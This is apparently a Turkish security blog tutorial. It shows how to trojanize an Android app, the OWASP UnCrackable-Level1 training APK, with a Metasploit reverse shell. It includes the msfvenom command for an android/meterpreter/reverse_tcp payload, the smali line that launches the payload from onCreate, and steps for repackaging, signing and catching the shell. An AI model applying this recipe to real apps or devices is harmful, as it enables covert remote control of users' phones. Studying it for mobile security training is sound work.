---
title: Reverse Shell in Android
date: 2019-03-15 16:08:00 +0300
categories: [mobile]
tags: [android, mobile, reverse shell]
description: Android için geliştirilmiş bir uygulama üzerinde yapılan değişiklikler ile reverse shell alınması
media_subpath: /assets/img/posts/android-reverse-shell
image: cover.png
---

Reverse Shell, saldırgan tarafından hedef sistem üzerine yüklenilen kod parçalarının çalıştırılması ile hedef – saldırgan sistem arasında kurulan bağlantı olarak tanımlanabilir. Buradaki önemli nokta, kurulacak olan bağlantının hedef sistem üzerinden başlatılmasıdır.

Web uygulamaları içerisinde saldırgan tarafından sistem üzerinde kod enjeksiyonu gerçekleştirilebilen senaryolarda, reverse shell oluşturularak uygulama sunucusu içerisine sızılması gerçekleştirilebilmektedir.

Android uygulamalarında ise “.apk” dosyasının açılması ve içerisine yerleştirilen reverse shell kodları ile tekrar paketlenmesi şeklinde bir atak senaryosu oluşturulmaktadır. Saldırgan tarafından hazırlanılan yeni “.apk” dosyasının internet üzerinden servis edilmesi sonrasında, uygulamayı indiren kullanıcılara ait cihazlar, saldırgan tarafından belirlenmiş olan adres ile bağlantı kuracaktır. Bu sayede saldırgan tarafından mobil cihaza yetkisiz erişim sağlanabilmektedir.

Konunun daha iyi anlaşılabilmesi için Owasp UnCrackable-Level1 uygulaması kullanılarak örnek gerçekleştirilecektir. İlk olarak UnCrackable-Level1.apk uygulaması “apktool” aracı kullanılarak “smali” formatına dönüştürülür.

Bir sonraki adımda reverse shell için kullanılacak olan payload ifadesinin üretilmesi gerekmektedir. Bu işlem için “msfvenom” aracı kullanılacaktır.

- msfvenom -p android/meterpreter/reverse_tcp LHOST=IP_ADDRESS LPORT=PORT_ADDRESS -o payload.apk

![](01.png)

Elde edilen “payload.apk” uygulaması “apktool” aracı kullanılarak “smali” formatına dönüştürülmektedir.

![](02.png)

Bu işlemler sonucunda iki farklı uygulama ve bu uygulamalara ait “smali” kodları elde edilmiştir. Bir sonraki aşamada, “payload.apk” uygulamasına ait “AndroidManifest.xml” dosyası içerisinde bulunan izin tanımları, “UnCrackable-Level1” uygulamasına ait “AndroidManifest.xml” içerisine taşınmaktadır.

“payload.apk” uygulamasına ait “AndroidManifest.xml” dosyasının görünümü aşağıdaki şekildedir.

![](03.png)

“UnCrackable-Level1.apk” uygulamasına ait “AndroidManifest.xml” dosyasının gerçekleştirilen işlemler sonrasındaki görüntüsü aşağıdaki şekildedir.

![](04.png)

Daha sonra “payload” klasörü altında bulunan “smali/com/metasploit” klasörü kopyalanarak, “UnCrackable-Level1” klasörü altında “smali/com” dizinine taşınır. Taşıma sonrasında elde edilen görüntü aşağıdaki şekilde olacaktır.

![](05.png)

Reverse shell komutlarını barındıran smali kodlarının ve gerçekleştirilecek işlemler esnasında gerek duyulabilecek izinlerin taşınması işlemi tamamlanmıştır. Geriye “UnCrackable-Level1” uygulamasının çalıştırılması ile reverse shell işleminin başlatılması kalmaktadır. Bunun için, ilk olarak “UnCrackable-Level1” uygulamasının başlatılması için çağırılan aktivitenin tespit edilmesi gerekmektedir.

Uygulamaya ait manifest dosyası içerisinde “android.intent.action.MAIN” anahtar kelimesinin aratılması sonucunda, “sg.vantagepoint.uncrackable1.MainActivity” sınıfının uygulamanın başlangıç aktivitesi olduğu tespit edilir.

![](06.png)

“sg.vantagepoint.uncrackable1.MainActivity” sınıfı ve içeriği aşağıdaki şekildedir.

![](07.png)

Android
mimarisinde bir sınıfın yüklenmesinin ardından, sınıf içerisinde bulunan
“onCreate” metodu çalıştırılmaktadır.
“sg.vantagepoint.uncrackable1.MainActivity” sınıfı içerisinde
“onCreate” anahtar kelimesi aratıldığında iki sonuç elde
edilmektedir. Bunlardan ilki “onCreate” metodunun tanımlandığı,
ikinci ise “onCreate” metodunun çağırıldığı bölümdür. Reverse shell
işlemini tetiklemek için kullanılacak olan smali kodları “onCreate”
metodunun çağırıldığı işlemden hemen sonra olacak şekilde yerleştirilmektedir.

Bu işlemde
kullanılacak olan smali kodları aşağıdaki şekildedir.

- “invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V”

Görüleceği üzere bu komut, “com/metasploit/stage/Payload” sınıfı içerisinde bulunan “start” metodunun çalıştırılmasını gerçekleştirmektedir. Komutun “sg.vantagepoint.uncrackable1.MainActivity” sınıfı içerisine yerleştirilmesinin ardından elde edilen görüntü aşağıdaki şekildedir.

![](08.png)

Gerçekleştirilen tüm değişiklikler kaydedilerek, yeni “.apk” oluşturma işlemine başlanılmaktadır. İlk olarak “.apk” dosyasının imzalanmasında kullanılacak olan “keystore” dosyası oluşturulmaktadır.

![](09.png)

Daha sonra “apktool” kullanılarak değiştirilmiş olan smali kodlarının yeniden “.apk” dosyasına dönüştürülmesi, compile edilmesi sağlanmaktadır.

![](10.png)

“Jarsigner” aracı ile elde edilen “.apk” dosyası imzalanarak paket oluşturma işlemi tamamlanmaktadır.

![](11.png)

Elde edilen uygulamanın mobil cihaza yüklenilmesi ile son aşamaya geçilmektedir.

Hatırlanacağı üzere, reverse shell payload ifadesi oluşturulurken bilgisayarımıza ait IP adresi ve PORT numarası belirtilmişti. Bu bilgileri kullanarak mobil cihaz tarafından reverse shell bağlantısı kurulacaktır. Mobil cihaz tarafından gelecek bağlantı kurma isteğini yakalamak için de bilgisayarımız üzerinde meterpreter aracı kullanılacaktır.

İlk olarak “msfconsole” komutu ile metasploit aracının çalıştırılması sağlanır. Sonrasında “exploit/multi/handler” modülü seçilir.

![](12.png)

“set PAYLOAD” komutu ile “android/meterpreter/reverse_tcp” payload seçeneği seçilerek, bağlantının bir android cihaz üzerinden alınacağı belirtilir.

![](13.png)

“show options” komutu ile ilgili payload ifadesi için gerekli olan bilgiler ekranda gösterilmektedir.

![](14.png)

Varsayılan olarak port bilgisinin “4444” olduğu görülmektedir. LHOST değerinin ise boş olduğu görülmektedir. Bu alan “0.0.0.0” olarak seçilerek tüm adreslerden gelebilecek isteklerin yakalanması sağlanmaktadır.

![](15.png)

“exploit” komutu ile “4444” portu üzerinde dinleme işlemi yapılmasına başlanılır.

![](16.png)

Mobil cihaz üzerine yüklenilmiş olan uygulamanın çalıştırılması ile birlikte reverse shell bağlantısı kurulduğu görülmektedir.

![](17.png)

Artık meterpreter komutları yardımı ile mobil cihaz üzerinde bir çok işlem gerçekleştirilebilecektir. Örneğin “shell” ifadesi ile mobil cihaz üzerinde komut satırına erişim sağlanabilmektedir.

![](18.png)

“sysinfo” komutu ile sistem hakkındaki bilgiler elde edilebilmektedir.

![](19.png)

“ps” komutu ile çalışmakta olan işlemler görüntülenebilmektedir.

![](20.png)

Meterpreter
üzerinde kullanılabilecek benzer komutlara aşağıdaki adres üzerinden
erişebilirsiniz. <https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/android/meterpreter/reverse_tcp.md>
